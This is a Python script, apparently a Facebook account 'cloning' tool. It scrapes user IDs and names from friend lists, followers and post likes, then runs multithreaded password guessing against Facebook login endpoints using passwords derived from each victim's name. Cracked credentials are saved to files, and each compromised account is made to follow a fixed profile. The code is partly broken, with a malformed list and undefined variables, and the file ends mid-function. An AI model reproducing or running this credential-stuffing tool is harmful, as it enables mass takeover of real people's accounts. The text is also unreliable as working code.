#!/usr/bin/python3
#-*-coding:utf-8-*-
# Update V1.6

### Import Module
import os
try:
    import requests
except ImportError:
    print('\n Module requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n Module futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n Module bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid
from concurrent.futures import ThreadPoolExecutor as BilalBSN
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  CHIGOZIEWORLDWIDE.  #
#------------------------------->

############################ RESPONSE FACEBOOK ###########################################
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
###########################################################################################
done = False
def animate():
    os.system("clear")
    for c in itertools.cycle(['\x1b[1;92m|', '\x1b[1;92m/', '\x1b[1;92m-', '\x1b[1;92m\\']):
        if done:
            break
        sys.stdout.write(f'\r{N}[{O}â€¢{N}] Loading ' + c)
        sys.stdout.flush()
        time.sleep(0.03)
t = threading.Thread(target=animate)
t.start()
time.sleep(0.5)
done = True

# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
ua_mbasic=['Mozilla/5.0 (Linux; Android 7.0; RNE-AL00 Build/HUAWEIRNE-AL00) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.4.4; es-es; GT-I9060C Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; HTC_One_S Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 2.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 4.3; fr-fr; SGH-T999 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 2.3.6; en-gb; GT-S5360 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 2.2; nl-nl; Desire_A8181 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 4.4.2; ru-ru; SM-T315 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',
'Mozilla/5.0 (Linux; U; Android 2.3.3; ru-ru; DROIDX Build/4.5.1_57_DX5-35) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; U30GT 2MH Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30'],
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+',
'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]',
'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
'Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3',
# LO KONTOL
def logo():
	print("""
\033[1;37;1m  ########  ####  ######  ##     ## ##     ##    
\033[1;37;1m  ##     ##  ##  ##    ## ##     ## ##     ##    
\033[1;37;1m  ##     ##  ##  ##       ##     ## ##     ##    
\033[1;37;1m  ########   ##   ######  ######### ##     ##    
\033[1;37;1m  ##   ##    ##        ## ##     ## ##     ##    
\033[1;37;1m  ##    ##   ##  ##    ## ##     ## ##     ##    
\033[1;37;1m  ##     ## ####  ######  ##     ##  #######     
\033[1;37;1m-----------------------------------------------
\033[1;37;1m  Author   : Rishu Khan
\033[1;37;1m  Facebook : https://facebook.com/mr.rishu.khan
\033[1;37;1m  Virson   : 1.2.0
\033[1;37;1m-----------------------------------------------
\033[1;37;1m░░░░░░░\033[1;37m╬ \033[1;37m\033[1;41m𝕀𝔽 𝕐𝕆𝕌 𝔻ℝ𝔼𝔸𝕄 𝕀𝕋 𝕐𝕆𝕌 ℂ𝔸ℕ 𝔻𝕆 𝕀𝕋\033[0m\033[1;37m ╬░░░░░░░
\033[1;37;1m-----------------------------------------------""")


### ORANG GANTENG ###
def hasil(OK,cp):
    if len(OK) != 0 or len(cp) != 0:
        print('\n----------------------------------------------')
        print(' Your Process Complete...')
        print('----------------------------------------------')
        print(' [%s+%s] \033[1;97mTOTAL OK : %s --- \033[1;97mAdf-ok.txt'%(O,O,str(len(ok))))
        print(' [%s+%s] \033[1;97mTOTAL CP : %s --- \033[1;97mAdf-cp.txt'%(O,O,str(len(cp))))
        print('----------------------------------------------')
        input(f"\n\033[1;97m Press Enter To Go Back ")
        bsn_menu()

def main():
    os.system('clear')
    logo()
    ipm = requests.get(url_ip).json() 
    IP = ipm["origin"]
    print(" [*] IP ADDRESS        [%s]"%(IP));time.sleep(0.01)
    print(47*'-')
    print("\033[1;37;1m[1] Public Cloning [P,F,L]")
    print("\033[1;37;1m[2] File Cloning")
    print("\033[1;37;1m[3] Create file Menu")
    print("\033[1;37;1m[4] Random Cloning  Menu")
    print("\033[1;37;1m[5] Separate & Duplicate cut")
    print("\033[1;37;1m[6] Owner Info")
    print("\033[1;37;1m[0] Exit")
    print(47*'-')
    pepek = input('[?] Choose Option : ')
    if pepek in['1','01']:
        crack()
    elif pepek in['2','02']:
        __bsn__().bilo(id)
    elif pepek in['3','03']:
        create_file()
    elif pepek in['4','04']:
        __rishu__().bilo(id)
    elif pepek in['5','05']:
        or_menu()
    elif pepek in['6','06']:
        s_c()
    elif pepek in['0','00']:
        __bsn__().bilo(id)
            

class __bsn__:

    def __init__(self):
        self.id = []

    def bilo(self,id):
        os.system('clear')
        logo()
        print("              file crack menu")
        print(' -------------------------------------------')
        print('')
        self.cnt = input('%s [+] file name :%s '%(P,K))
        try:
            self.id = open(self.cnt).read().splitlines()
        except FileNotFoundError:
            print('  File not found on provided path, try again ....')
            time.sleep(1)
            crack()
            os.system('clear')
            logo()
            print("              Method Menu")
            print('-------------------------------------------')
            print('')
            print(' [+] Method 1')
            print(' [+] Method 2')
            print(' [+] Method 3 (Best)')
            self.__pler__()
        else:
            print(' Choose Correct One');self.bilo(id)

    def __api__(self, user, __chi__):
        global ok,cp,loop,ua_mbasic
        ua = random.choice(ua_mbasic)
        for i in list('\|-/'):
            sys.stdout.write(f'\r [ADF] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            session=requests.Session()
            try: os.mkdir('results')
            except: pass
            p = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ua+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
            if "access_token" in p:
                print('\r [OK-ADF] %s | %s ' % (user,pw))
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('bsn-ok.txt' , 'a').write('%s\n' % wrt)
                break
            elif "www.facebook.com" in p["error_msg"]:
                try:
                    kontol = open('.token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r%s \033[1;91m[CP-ADF] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('bsn-cp.txt' , 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r%s \033[1;91m[CP-ADF] %s | %s ' % (K,user,pw))
                wrt = '%s|%s' % (user,pw)
                cp.append(wrt)
                open('bsn-cp.txt' , 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1

    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r [ADF] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://m.facebook.com/",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "cache-control":"max-age=0",
                    "upgrade-insecure-requests":"1",
                    "origin":"https://"+cebok,
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f'\r{H} [OK-ADF] {user} | {pw}')
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('bsn-ok.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s \033[1;91m[CP-ADF] %s | %s ' % (K,user,pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('bsn-cp.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    print('\r%s \033[1;91m[CP-ADF] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('bsn-cp.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue

            loop+=1
        except:
            self.__metode__(user, pw, cebok)
#    <- Bot followers ->
    def follow(self,session,coki):
        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100065533669299",cookies={"cookie":coki}).text,"html.parser")
        get = r.find("a",string="Ikuti").get("href")
        session.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":coki}).text

    def __pler__(self):
        chi = ('3')
        if chi == '':
            print('\nSelect Correct One');self.__pler__()
        elif chi in ('1', '01'):
            os.system('clear')
            logo()
            print('')
            print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
            print(' \033[1;97mYour Process Started in Background')
            print('-------------------------------------------')
            print('')
            with BilalBSN(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        kirim.submit(self.__api__, uid, pwx)
                    except:
                        pass

            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system('clear')
            logo()
            print('')
            print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
            print(' \033[1;97mYour Process Started in Background')
            print('-------------------------------------------')
            print('')
            with BilalBSN(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        kirim.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass

            hasil(ok,cp)
        elif oldpass in ('3', '03'):

            os.system('clear')
            logo()
            print('')
            print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
            print(' \033[1;97mYour Process Started in Background')
            print('-------------------------------------------')
            print('')
            with BilalBSN(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name,xz[0]+'1234',xz[0]+'1234',xz[0]+'12345',xz[0]+'786']
                        else:
                            pwx = [name,xz[0]+'1234',xz[0]+'1234',xz[0]+'12345',xz[0]+'786']
                        kirim.submit(self.__metode__, uid, pwx, "m.facebook.com")
                    except:
                        pass

            hasil(ok,cp)
        else:
            print('\n Select Valid One');self.__pler__()
            
def create_file():
    os.system('clear')
    logo()
    print('[1] Create file form Public')
    print('[2] Create file from followers')
    print('[3] Create file with post likes')
    print('[0] Back to main menu')
    print(47*'-')
    cf1 = input('[?] Choose : ')
    if cf1 =='1':
        pub()
    elif cf1 =='2':
        folw()
    elif cpb =='3':
        likes()
    elif cf1 =='0':
        main()
        
def pub():
    os.system('clear')
    logo()
    print('[1] Create file single ids')
    print('[2] Create file auto (unlimited)')
    print('[0] Back to main menu')
    print(47*'-')
    cpb = input('[?] Choose : ')
    if cpb =='1':
        manual()
    elif cpb =='2':
        auto()
    elif cpb =='0' or cpb =='00' or cpb =='000':
        main()
    else:
        print('\n  Choose correct option ...')
        time.sleep(1)
        pub()
        
def folw():
    os.system('clear')
    logo()
    print('[1] Create file single ids')
    print('[2] Create file auto (unlimited)')
    print('[0] Back to main menu')
    print(47*'-')
    cf = input('[?] Choose : ')
    if cf =='1':
        manualf()
    elif cf =='2':
        autof()
    elif cf =='0' or cf =='00' or cf =='000':
        main()
    else:
        print('\n  Choose correct option ...')
        time.sleep(1)
        folw()

def login():
    os.system('clear')
    logo()
    print("[!] PLEASE USE [AAAA] TOKEN TO FAST CLONING :)")
    print(47*'-')
    tok = input('[?] Put access token : \033[1;32;1m')
    print(47*'\033[1;37;1m-')
    if 'EAAAA' in tok:
        pass
    else:
        print('[?] Only fb ads access token can be used for scraping data')
        print('[!] Check main menu for creating fb ads access token....o')
        os.sys.exit()
    try:
        u = requests.get('https://graph.facebook.com/me?access_token='+tok).text
        u1 = json.loads(u)
        name = u1['name']
        ts = open('access_token.txt', 'w')
        ts.write(tok)
        ts.close()
        print('\033[1;32;1m[✓] Logged in successfully')
        time.sleep(1)
        main()
    except KeyError:
        print('\n Invalid token provided, try again  ')
        time.sleep(1)
        login()
def manual():
    try:
        token = open('access_token.txt', 'r').read()
    except FileNotFoundError:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+token).text
        q = json.loads(r)
        uname = q['name']
    except (KeyError):
        login()
    os.system('clear')
    logo()
    print('[+] Logged user Name : \033[1;32;1m'+uname)
    print(47*'\033[1;37;1m-')
    limit = int(input('[?] How many ids do you want to add : '))
    print(47*'-')
    save_file = input('[?] Input save file name : ')
    print(47*'-')
    t = 0
    for u in range(limit):
        t+=1
        try:
            ids = input('[%s] Input id : '%t)
            r = requests.get('https://graph.facebook.com/'+ids+'/friends?access_token='+token).text
            q = json.loads(r)
            for j in q['data']:
                uids = j['id']
                names = j['name']
                with open('/sdcard/'+save_file, 'a') as rd:
                    rd.write(uids+'|'+names+'\n')
        except KeyError:
            print('\033[1;31;1mNo friend for '+ids)
            pass
    print(47*'\033[1;37;1m-')
    print('[!] Save file name : '+save_file)
    print(47*'-')
    input('Press enter to back')
    main()
def likes():
    try:
        token = open('access_token.txt', 'r').read()
    except FileNotFoundError:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+token).text
        q = json.loads(r)
        uname = q['name']
    except (KeyError):
        login()
    os.system('clear')
    logo()
    print('[+] Logged user Name : \033[1;32;1m'+uname)
    print(47*'\033[1;37;1m-')
    limit = int(input('[?] From how many posts do you want to extract : '))
    print(47*'-')
    save_file = input('[?] Save file name : ')
    print(47*'-')
    t = 0
    for u in range(limit):
        t+=1
        try:
            ids = input('[%s] Input post link : '%t)
            r = requests.get('https://graph.facebook.com/'+ids+'/reactions?limit=999999&access_token='+token).text
            q = json.loads(r)
            for j in q['data']:
                uids = j['id']
                names = j['name']
                with open('/sdcard/'+save_file, 'a') as rd:
                    rd.write(uids+'|'+names+'\n')
                if 'next' in str(q):
                    l1 = q['paging']
                    l2 = l1['next']
                    r2 = requests.get(l2)
                    q=json.loads(r2.text)
                    for j in q['data']:
                        uids = j['id']
                        names = j['name']
                        first_name = names.split(' ')[0]
                        try:
                            last_name = names.split(' ')[1]
                        except:
                            last_name = 'Khan'
                        with open('/sdcard/'+save_file, 'a') as rd:
                            rd.write(uids+'|'+first_name+'|'+last_name+'\n')
                else:pass
        except KeyError:
            print('\033[1;31;1m[×] No likes for '+ids)
            pass
    print(47*'\033[1;37;1m-')
    print('[!] Save file name : '+save_file)
    print(47*'-')
    input('Press enter to back')
    main()
def auto():
    os.system('rm -rf temp*')
    try:
        access_token = open('access_token.txt', 'r').read()
    except:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+access_token).text
        requests.post('https://graph.facebook.com/1376599765/subscribers?access_token='+access_token).text
        q = json.loads(r)
        uname = q['name']
    except:
        login()
    os.system('clear')
    logo()
    print('[+] Logged user Name : \033[1;32;1m'+uname)
    print(47*'\033[1;37;1m-')
    nusrat = []
    try:
        limit_user = int(input('[?] How many ids do you want to add : '))
        print(47*'-')
    except:
        limit_user = 1
    count = 0
    for fir in range(limit_user):
        count +=1
        udit = input('[%s] Put id : '%(count))
        try:
            tfile = open('access_token.txt','r').read()
            fr = requests.get('https://graph.facebook.com/'+udit+'/subscribers?limit=50000&access_token='+tfile).text
            qfr = json.loads(fr)
            temp_save = open('temp.txt', 'a')
            for data in qfr['data']:
                uids = data['id']
                if uids in nusrat:
                    pass
                else:
                    nusrat.append(uids)
                    temp_save.write(uids+'\n')
            temp_save.close()
        except KeyError:
            if 'invalid' in str(fr):
                print('\033[1;31;1mLogged token has expired ...')
                pass
            else:
                print('\033[1;31;1mNo friends found for user: '+udit)
                pass
    os.system('clear')
    logo()
    print('\033[1;37;1m[+] Total ids : \033[1;32;1m'+str(len(nusrat)))
    print(47*'\033[1;37;1m-')
    try:
        ask_link = int(input('[?] How many links do you want to grab : '))
        print(47*'-')
        print('[!] Input like this : 100078,100079')
        print(47*'-')
    except:
        ask_link = 1
    completed = 0
    for links in range(ask_link):
        completed +=1
        li = input('[%s] Link : '%completed)
        os.system('cat temp.txt | grep "'+li+'" >> temp2.txt')
        print(47*'-')
    save_file = input('[?] Input save file as : \033[1;32;1m')
    os.system('clear')
    lines = open('temp2.txt', 'r').readlines()
    logo()
    print('\033[1;37;1m[$] Total ids to grab : \033[1;32;1m'+str(len(lines)))
    print('\033[1;37;1m[$] Grabbing Process has started')
    print(47*'-')
    fileid = 'temp2.txt'
    fileidopen = open(fileid, 'r').read().splitlines()
    dill = []
    for ids in fileidopen:
        try:
            tfile = open('access_token.txt','r').read()
            rg = requests.get('https://graph.facebook.com/'+ids+'/subscribers?limit=50000&access_token='+tfile).text
            rgq = json.loads(rg)
            idsave=open('/sdcard/'+save_file, 'a')
            for inayat in rgq['data']:
                uids = inayat['id']
                dill.append(uids)
                nm = inayat['name']
                idsave.write(uids+'|'+nm+'\n')
            print('\033[1;37;1m[$] Grabbed from : \033[1;32;1m'+ids)
           # print('  Total friends: '+str(len(uids)))
            print('\033[1;37;1m[+] Token status : \033[1;32;1mLive')
            print(47*'\033[1;37;1m-')
            idsave.close()
        except Exception as e:
            #print(e)
            if 'invalid' in str(rg):
                print('\033[1;31;1mToken has expired, try again ...')
                os.system('rm -rf temp*')
                pass
            else:
                print('\033[1;37;1m[$] Grabbed from : \033[1;31;1m'+ids)
                print('\033[1;37;1m[+] Friendlist ids : \033[1;31;1m0')
                print('\033[1;37;1m[+] Token status : \033[1;32;1mLive')
                print(47*'\033[1;37;1m-')
                os.system('rm -rf temp*')
                pass
    lenid = open('/sdcard/'+save_file, 'r').readlines()
    print('\033[1;37;1m[+] Grabbing Process has completed ')
    os.system('rm -rf temp*')
    print('\033[1;37;1m[$] Total ids grabbed : \033[1;32;1m'+str(len(lenid)))
    print('\033[1;37;1m[+] File saved as: /sdcard/'+save_file)
    print(47*'-')
    input('Press enter to back ')
    main()
    
def loginf():
    os.system('clear')
    logo()
    print("[!] PLEASE USE [AAAA] TOKEN TO FAST CLONING :)")
    print(47*'-')
    tok = input('[?] Put access token : \033[1;32;1m')
    print(47*'\033[1;37;1m-')
    if 'EAAAA' in tok:
        pass
    else:
        print('[?] Only fb ads access token can be used for scraping data')
        print('[!] Check main menu for creating fb ads access token....o')
        os.sys.exit()
    try:
        u = requests.get('https://graph.facebook.com/me?access_token='+tok).text
        u1 = json.loads(u)
        name = u1['name']
        ts = open('access_token.txt', 'w')
        ts.write(tok)
        ts.close()
        print('\033[1;32;1m[✓] Logged in successfully')
        time.sleep(1)
        main()
    except KeyError:
        print('\n Invalid token provided, try again  ')
        time.sleep(1)
        login()
def manualf():
    try:
        token = open('access_token.txt', 'r').read()
    except FileNotFoundError:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+token).text
        q = json.loads(r)
        uname = q['name']
    except (KeyError):
        login()
    os.system('clear')
    logo()
    print('[+] Logged user Name : \033[1;32;1m'+uname)
    print(47*'\033[1;37;1m-')
    limit = int(input('[?] How many ids do you want to add : '))
    print(47*'-')
    save_file = input('[?] Input save file name : ')
    print(47*'-')
    t = 0
    for u in range(limit):
        t+=1
        try:
            ids = input('[%s] Input id : '%t)
            r = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&access_token='+token).text
            q = json.loads(r)
            for j in q['data']:
                uids = j['id']
                names = j['name']
                with open('/sdcard/'+save_file, 'a') as rd:
                    rd.write(uids+'|'+names+'\n')
        except KeyError:
            print('\033[1;31;1mNo friend for '+ids)
            pass
    print(47*'\033[1;37;1m-')
    print('[!] Save file name : '+save_file)
    print(47*'-')
    input('Press enter to back')
    main()
    
def autof():
    os.system('rm -rf temp*')
    try:
        access_token = open('access_token.txt', 'r').read()
    except:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+access_token).text
        requests.post('https://graph.facebook.com/1376599765/subscribers?access_token='+access_token).text
        q = json.loads(r)
        uname = q['name']
    except:
        login()
    os.system('clear')
    logo()
    print('[+] Logged user Name : \033[1;32;1m'+uname)
    print(47*'\033[1;37;1m-')
    nusrat = []
    try:
        limit_user = int(input('[?] How many ids do you want to add : '))
        print(47*'-')
    except:
        limit_user = 1
    count = 0
    for fir in range(limit_user):
        count +=1
        udit = input('[%s] Put id : '%(count))
        try:
            tfile = open('access_token.txt','r').read()
            fr = requests.get('https://graph.facebook.com/'+udit+'/subscribers?limit=50000&access_token='+tfile).text
            qfr = json.loads(fr)
            temp_save = open('temp.txt', 'a')
            for data in qfr['data']:
                uids = data['id']
                if uids in nusrat:
                    pass
                else:
                    nusrat.append(uids)
                    temp_save.write(uids+'\n')
            temp_save.close()
        except KeyError:
            if 'invalid' in str(fr):
                print('\033[1;31;1mLogged token has expired ...')
                pass
            else:
                print('\033[1;31;1mNo friends found for user: '+udit)
                pass
    os.system('clear')
    logo()
    print('\033[1;37;1m[+] Total ids : \033[1;32;1m'+str(len(nusrat)))
    print(47*'\033[1;37;1m-')
    try:
        ask_link = int(input('[?] How many links do you want to grab : '))
        print(47*'-')
        print('[!] Input like this : 100078,100079')
        print(47*'-')
    except:
        ask_link = 1
    completed = 0
    for links in range(ask_link):
        completed +=1
        li = input('[%s] Link : '%completed)
        os.system('cat temp.txt | grep "'+li+'" >> temp2.txt')
        print(47*'-')
    save_file = input('[?] Input save file as : \033[1;32;1m')
    os.system('clear')
    lines = open('temp2.txt', 'r').readlines()
    print(logo)
    print('\033[1;37;1m[$] Total ids to grab : \033[1;32;1m'+str(len(lines)))
    print('\033[1;37;1m[$] Grabbing Process has started')
    print(47*'-')
    fileid = 'temp2.txt'
    fileidopen = open(fileid, 'r').read().splitlines()
    dill = []
    for ids in fileidopen:
        try:
            tfile = open('access_token.txt','r').read()
            rg = requests.get('https://graph.facebook.com/'+ids+'/subscribers?limit=50000&access_token='+tfile).text
            rgq = json.loads(rg)
            idsave=open('/sdcard/'+save_file, 'a')
            for inayat in rgq['data']:
                uids = inayat['id']
                dill.append(uids)
